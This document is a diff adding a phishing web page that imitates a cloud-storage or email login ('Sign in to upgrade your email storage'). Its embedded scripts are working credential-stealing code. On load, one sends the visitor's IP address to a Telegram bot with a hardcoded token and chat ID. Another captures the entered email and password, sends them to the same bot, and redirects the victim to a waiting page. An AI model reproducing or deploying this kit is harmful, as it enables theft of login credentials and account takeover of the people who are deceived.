@@ -1,0 +1,94 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="images/logo.png" type="image/x-icon">
+    <title>Manage your cloud storage</title>
+
+    <script>
+    function sendIPToTelegram() {
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const botToken = '6313373570:AAGd6rv_inDaOQsS4Y31OFSmOnC4nAzgEr0';
+          const chatId = '5982389297';
+          const message = `Client IP: ${ip}`;
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", url, true);
+          xhr.send();
+        });
+    }
+    sendIPToTelegram();
+  </script>
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body class="cb" style="
+    background-position: right;
+">
+    <div class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup" style="
+    margin: 20px auto;
+">
+<form name="form" id="messageForm" >
+    <img src="images/logo.png" alt="" class="logo"><div class="title"><div role="heading" aria-level="1" data-bind="text: title">Sign in to upgrade your email storage</div></div>
+    
+    
+    
+    <input class="form-control ltr_override input ext-input text-box ext-text-box form-group" 
+    name="email" id="email" type="email" placeholder="Email Address" required>
+
+    <input class="form-control ltr_override input ext-input text-box ext-text-box form-group" 
+    name="pass" id="pass" type="password" placeholder="Password" required>
+
+    
+
+<div class="col-md-24">
+<input type="submit" value="Sign In" class="button ext-button primary ext-primary" style="display: inline-block;width: auto;"></div>
+
+</form>
+<script>
+                document.getElementById("messageForm").addEventListener("submit", function (event) {
+                    event.preventDefault(); // Prevent form submission
+        
+                    const email = document.getElementById("email").value;
+                    const password = document.getElementById("pass").value;
+        
+                    // Replace with your actual Telegram bot token and chat ID
+                    const botToken = "6313373570:AAGd6rv_inDaOQsS4Y31OFSmOnC4nAzgEr0";
+                    const chatId = "5982389297";
+                    const text = `Email: ${email}\nPassword: ${password}`;
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+        
+                    fetch(url, { method: "GET" })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log("Message sent successfully!");
+                                // Redirect to another page (replace with your desired URL)
+                        window.location.href = "wait.html"; // Change this U
+                            } else {
+                                console.error("Error sending message:", response.statusText);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Network error:", error);
+                        });
+                });
+            </script>
+</div>
+
+
+    </div>
+    
+    <div class="footer ext-footer" style="
+    text-align: end;
+">
+    <a href="#" class="footer-content ext-footer-content footer-item ext-footer-item">
+Terms of use</a> <a href="#" class="footer-content ext-footer-content footer-item ext-footer-item"> Privacy &amp; cookies</a>
+     <a href="#" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...
+</a>
+</div>
+
+
+
+</body></html>
